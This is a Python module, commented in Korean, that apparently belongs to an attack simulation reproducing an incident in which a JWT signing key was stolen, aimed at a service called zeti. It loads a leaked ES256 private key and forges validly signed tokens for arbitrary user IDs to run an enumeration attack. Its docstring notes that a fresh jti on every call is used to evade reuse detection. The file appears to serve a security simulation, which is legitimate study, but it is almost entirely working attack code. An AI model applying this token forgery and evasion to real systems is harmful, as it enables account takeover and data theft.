"""
JWT 위조 공통 함수 (서명키 탈취 시나리오 전용).

쿠팡 사고 재현 — leaked-key (외부 alias KMS 키 가정 유출본)를 사용해 매번 새 sub로
새 jti, sub == path 일치하는 정상 서명 토큰을 위조한다.
서명은 ES256(ECC_NIST_P256), kid는 KMS alias 그대로 박음.

사용처:
  S4 / S6 / S5 — forge_token() — 키 탈취 후 임의 sub로 위조하는 enumeration 공격
  S2          — forge_token 사용 X. /auth/login으로 발급된 진짜 토큰을 그대로 사용.
"""
import jwt
import time
import uuid
import os
from pathlib import Path

_PRIV_KEY = None


def load_key():
    """
    개인키를 캐시. 매번 디스크 읽으면 시뮬 속도 저하.

    LEAKED_KEY_PATH가 상대 경로면 attack-payload root(이 파일의 상위 디렉토리) 기준으로
    해석한다. 덕분에 어떤 cwd에서 시나리오를 실행해도 키를 찾을 수 있다.
    """
    global _PRIV_KEY
    if _PRIV_KEY is None:
        raw = os.environ["LEAKED_KEY_PATH"]
        key_path = Path(raw)
        if not key_path.is_absolute():
            root = Path(__file__).resolve().parent.parent  # attack-payload/
            key_path = (root / key_path).resolve()
        _PRIV_KEY = key_path.read_text()
    return _PRIV_KEY


def _build_payload(sub: int, jti: str, ttl_seconds: int) -> dict:
    now = int(time.time())
    return {
        "iss": "https://auth.zeti.com/",
        "aud": ["https://api.zeti.com"],
        "sub": str(sub),
        "jti": jti,
        "iat": now,
        "exp": now + ttl_seconds,
        "auth_time": now,
        "nbf": now,
        "client_id": "zeti-web",
        "scp": ["openid", "core"],
        "acr": "aal1",
        "amr": ["pwd"],
    }


def forge_token(sub: int, ttl_seconds: int = 600) -> str:
    """
    sub를 path와 일치시켜 위조한 정상 서명 토큰을 반환. 매 호출마다 새 jti.

    S4/S5/S5b/S6에서 사용 — 매 요청이 서로 다른 jti라 jti 기반 동일 토큰 재사용 탐지에는 안 걸림.
    """
    jti = str(uuid.uuid4())
    payload = _build_payload(sub, jti, ttl_seconds)
    kid = os.environ.get("KID", "alias/jwt-signing-key-external")
    return jwt.encode(
        payload,
        load_key(),
        algorithm="ES256",
        headers={"kid": kid, "typ": "JWT"},
    )
